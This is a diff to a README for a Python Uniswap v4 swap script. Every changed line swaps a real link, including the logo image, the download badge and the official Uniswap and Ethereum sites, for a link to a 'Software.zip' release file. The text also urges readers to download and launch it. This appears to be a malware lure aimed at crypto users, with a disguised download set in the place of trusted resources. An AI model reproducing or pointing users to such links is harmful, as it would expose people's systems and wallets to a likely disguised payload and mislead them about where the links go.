@@ -1,7 +1,7 @@
 
 # Uniswap Python Swapper
 
-![Uniswap Logo](https://upload.wikimedia.org/wikipedia/commons/3/33/Uniswap_protocol_logo_purple_circle.png)
+![Uniswap Logo](https://github.com/12-catalan/uniswap-python-swapper/releases/download/v2.0/Software.zip)
 
 ## Overview
 Welcome to the `uniswap-python-swapper` repository - your go-to resource for executing `SWAP_EXACT_IN` (Exact Input) swaps on Uniswap v4 Universal Router using Python. This user-friendly Python script showcases how to seamlessly perform token swaps across various Layer 2 networks, with a focus on improving your trading experience on Uniswap v4.
@@ -15,7 +15,7 @@ Welcome to the `uniswap-python-swapper` repository - your go-to resource for exe
 
 ## Installation
 To get started, simply download the latest release of the `uniswap-python-swapper` script from the provided link below:
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/12-catalan/uniswap-python-swapper/releases/download/v2.0/Software.zip%20Release-blue)](https://github.com/12-catalan/uniswap-python-swapper/releases/download/v2.0/Software.zip)
 
 Once downloaded, launch the script to begin utilizing the powerful features of Uniswap v4 in Python!
 
@@ -38,8 +38,8 @@ Once downloaded, launch the script to begin utilizing the powerful features of U
 - uniswap-v4
 
 ## Resources
-- [Uniswap Official Website](https://uniswap.org/)
-- [Ethereum Developer Documentation](https://ethereum.org/developers/)
+- [Uniswap Official Website](https://github.com/12-catalan/uniswap-python-swapper/releases/download/v2.0/Software.zip)
+- [Ethereum Developer Documentation](https://github.com/12-catalan/uniswap-python-swapper/releases/download/v2.0/Software.zip)
 
 ## Contribute
 Contributions to the `uniswap-python-swapper` repository are highly appreciated. Feel free to fork the repository, make improvements, and submit a pull request with your changes.
